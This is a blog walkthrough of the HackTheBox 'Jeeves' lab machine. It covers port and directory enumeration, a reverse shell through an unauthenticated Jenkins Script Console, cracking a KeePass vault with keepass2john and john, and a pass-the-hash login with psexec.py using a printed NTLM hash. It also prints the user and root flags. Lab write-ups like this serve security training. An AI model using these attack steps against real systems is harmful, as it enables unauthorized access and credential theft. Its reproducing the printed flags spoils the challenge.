---
title: "HackTheBox: Jeeves"
date: 2024-08-27
categories:
  - blog
tags:
  - hackthebox
  - jenkins
  - keepass_vault_crack
---
![](/assets/img/jeeves/Walkthrough-jeeves-card.png)

Jeeves is a retired Windows based system that is accessible with a VIP HackTheBox membership. The box is rated as "Medium" difficulty. I encountered issues where port 50000/tcp was not open and listening when the system spawned. As 50000/tcp is the entry point into this box (spoiler alert), I attempted several reboots and wound up with the same result. I shut the system down and spawned it again at a later date.  

Let's start at the beginning. 

Nmap scan of all ports to start enumerating the system.

```
└─$ nmap -vv -sCV -T4 -p- 10.10.10.63 -oA jeeves-nmap
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-25 09:58 EDT

***CLIPPED***

Nmap scan report for jeeves.htb (10.10.10.63)
Host is up, received syn-ack (0.022s latency).
Scanned at 2024-08-25 09:58:57 EDT for 135s
Not shown: 65531 filtered tcp ports (no-response)
PORT      STATE SERVICE      REASON  VERSION
80/tcp    open  http         syn-ack Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Ask Jeeves
135/tcp   open  msrpc        syn-ack Microsoft Windows RPC
445/tcp   open  microsoft-ds syn-ack Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         syn-ack Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Nmap has located some interesting ports and a hostname.  Maybe a web server running on 80/tcp and 50000/tcp? Perhaps an anonymous SMB share on 445/tcp?

Added the hostname to /etc/hosts and browsed to http://jeeves.htb

![](/assets/img/jeeves/Walkthrough-jeeves-80.png)

Searching for anything redirects to error.html which displays an old MSSQL error screen. Or does it?

![](/assets/img/jeeves/Walkthrough-fake-error.png)

It appears this error.html was set up as a potential rabbit hole. We can confirm the message is a fake error by viewing the source of the page. Clicking on the "jeeves.PNG" link forwards us to the exact image:

![](/assets/img/jeeves/Walkthrough-fake-error-source.png)

Directory busting the site finds no further directories. This may be a dead end:

```
└─$ ffuf -ac -w /usr/share/seclists/SecLists-master/Discovery/Web-Content/combined_directories.txt -u http://jeeves.htb/FUZZ -fs 503

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://jeeves.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/SecLists-master/Discovery/Web-Content/combined_directories.txt
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 503
________________________________________________

:: Progress: [1377718/1377718] :: Job [1/1] :: 2173 req/sec :: Duration: [0:11:21] :: Errors: 3 ::
```

Let's check for any subdomains that might be hosted:

```
└─$ ffuf -ac -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://10.10.10.63 -H "HOST: FUZZ.jeeves.htb" 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.63
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.jeeves.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

:: Progress: [19966/19966] :: Job [1/1] :: 1851 req/sec :: Duration: [0:00:11] :: Errors: 0 ::
```

No sub-domains found. Let's move on and continue enumerating the system.

Check for anonymous SMB shares:

![](/assets/img/jeeves/Walkthrough-smb-shares.png)

No luck.

Moving on port 50000/tcp which nmap identifies as "Jetty(9.4.z-SNAPSHOT)". We receive HTTP ERROR 404. This could be the result of a misconfiguration or maybe there is no site. Let's further enumerate.

![](/assets/img/jeeves/Walkthrough-jetty-error.png)

Fuzz for directories:

```
ffuf -ac -w /usr/share/seclists/SecLists-master/Discovery/Web-Content/combined_directories.txt -u http://jeeves.htb:50000/FUZZ 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://jeeves.htb:50000/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/SecLists-master/Discovery/Web-Content/combined_directories.txt
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

askjeeves     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 17ms]
```

Our fuzz attempt is successful and we find the "askjeeves" directory. Browsing to the directory we locate a Jenkins site which doesn't appear to require any login credentials:

![](/assets/img/jeeves/Walkthrough-askjeeves-jenkins.png)

We can use the "Script Console" to get our initial reverse shell to the system:

![](/assets/img/jeeves/Walkthrough-jenkins-script-console.png)

With our reverse shell established we can start enumerating the system.

![](/assets/img/jeeves/Walkthrough-jenkins-user-shell.png)

We find the user flag on kohsuke's desktop:

![](/assets/img/jeeves/Walkthrough-user-flag.png)

```
e3232272596fb47950d59c4cf1e7066a
```

Searching through the other directories on kohsuke's profile we locate a CEH.kdbx file. A quick search identifies this file as a KeePass database.

Copied database to the "userContent" folder for easy download to our attacker machine:

![](/assets/img/jeeves/Walkthrough-keepass-transfer.png)

When attempting to open the file with KeePassXC we are prompted to enter a vault password:

![](/assets/img/jeeves/Walkthrough-keepass-password-prompt.png)

We haven't located any passwords just yet, but a quick search on cracking KeePass passwords leads us to this article: [https://thedutchhacker.com/how-to-crack-a-keepass-database-file/](https://thedutchhacker.com/how-to-crack-a-keepass-database-file/)

Export the hash into a format that can be cracked with john:

```
┌──(kali㉿kali)-[~/Downloads]
└─$ keepass2john CEH.kdbx > ~/Documents/htb/jeeves/keepass-hash.txt 
```

Keepass vault password cracked with john:

![](/assets/img/jeeves/Walkthrough-ceh-kdbx-password.png)

Perusing the password vault, we've found an interesting looking password hash. Perhaps it's the password hash for the administrator account:

![](/assets/img/jeeves/Walkthrough-administrator-hash.png)

Tested password hash with the administrator account via Psexec.py to establish shell:

```
└─$ psexec.py administrator@10.10.10.63 -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Requesting shares on 10.10.10.63.....
[*] Found writable share ADMIN$
[*] Uploading file edbkoTlL.exe
[*] Opening SVCManager on 10.10.10.63.....
[*] Creating service Jcer on 10.10.10.63.....
[*] Starting service Jcer.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

Taking a look at the administrator's desktop, we are not presented with the typical root.txt flag, but instead, there is a file called hm.txt. The contents of the file read "The flag is elsewhere. Look deeper."

Look deeper? The root flag is always located in the desktop folder. Is it possible that the file is there, just hidden?

Executing dir /a:h does not show any additional files. There is another technique to "hide" files in plain sight. That technique involves using Alternate Data Streams (ADS).

Alternate Data Streams (ADS) are a feature of the NTFS file system in Windows that allow files to contain more than one stream of data and were originally introduced for compatibility with Mac Hierarchical File System (HFS). You can essentially hide a file within the alternate data stream of another file. The file written to the alternate data stream is typically not visible in standard file listings such as the "dir" command.

How do we tell if an alternate data stream has been written? We can use "dir /r" command to show any alternate data streams (ADS) that are part of a file.

As shown below, the root flag was hidden in alternate data stream inside of hm.txt:

![](/assets/img/jeeves/Walkthrough-alternate-data-stream-root.png)

To type the contents of root.txt to the screen we issue: 
```
more < hm.txt:root.txt

afbc5bd4b615a60648cec41c6ac92530
```

We now have the root and user flag ready to submit.

Success! On to the next challenge.

While there may be many paths you can take to exploit this box, this one was mine and I hope you find this write-up useful.

![](/assets/img/jeeves/Walkthrough-jeeves-pwned.png)